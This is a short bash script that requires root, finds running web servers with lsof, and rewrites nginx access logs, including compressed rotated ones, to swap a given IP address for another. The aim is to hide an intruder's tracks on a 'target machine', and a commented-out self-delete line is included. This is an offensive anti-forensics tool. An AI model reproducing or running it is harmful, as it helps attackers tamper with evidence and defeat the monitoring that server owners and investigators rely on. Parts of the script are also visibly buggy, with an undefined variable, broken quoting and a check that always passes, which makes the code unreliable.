#!/usr/bin/env bash
### by t4z3v4r3d ###
if [ "`id -u`" != "0" ];then
echo -e  "\033[1;31m $0 cant run as $USER Please Give me root perms!!!!! \033[0;0m"
exit 1
fi
[ lsof ]|| echo "LSOF NOT FOUND ! exit 1;" || exit 1 
[ $# -lt 2 ] && echo "usage : $0 \"your ip \" " && exit 1 
ip=$1
replace=$2
os=$OSTYPE
# you can add all paths for all os type !M$ windows IS NOT OS ....Exactly!
case $os in
Linux*) number="\$9"
	zip_type=gz
;;
linux*) number="\$9"
	zip_type=gz
;;
FreeBSD*) number="\$8,\"/\",\$10"
	  zip_type=bz2
;;
*) number=*
;;
esac
echo "Searching for @ YOUR ! IP: $ip target machine: $os "
# find which one of httpd server is running .... 
info="`lsof 2>/dev/null -iTCP -sTCP:LISTEN -PN |grep  '*:80\|*:443' 2> /dev/null`" ### if listening port is default everything will be ok, else change it you ownz it not me .
web_srv="`printf "$info\n"|awk {' print $1 '}|uniq`"
#logs
for line in "`lsof 2>/dev/null| grep nginx | grep log  | awk {' print '$number' '} | sort | uniq | sed 's/ //g'`";do 
[ "`grep -m 1  $ip $line`" ]&& sed 's/'$ip'/'$replace'/g' $line >/tmp/$(basename $line) ### change it for log name ! 
[ -f "$line.*.$zip_type" ]&& echo "old compressed logs found ! " && for zp in  $(ls $line.*.$zip_type) ;do 	
gzip -cdk $zp | sed 's/'$ip'/'$target'/g' | gzip >/tmp/$(basename $zp)" ;echo " mv /tmp/$(basename $zp) $line.$(basename $zp) ;done || echo "no such compressed log were found " 
### needz to more workout on file name and path. I'm too tired now.
done
#rm $0
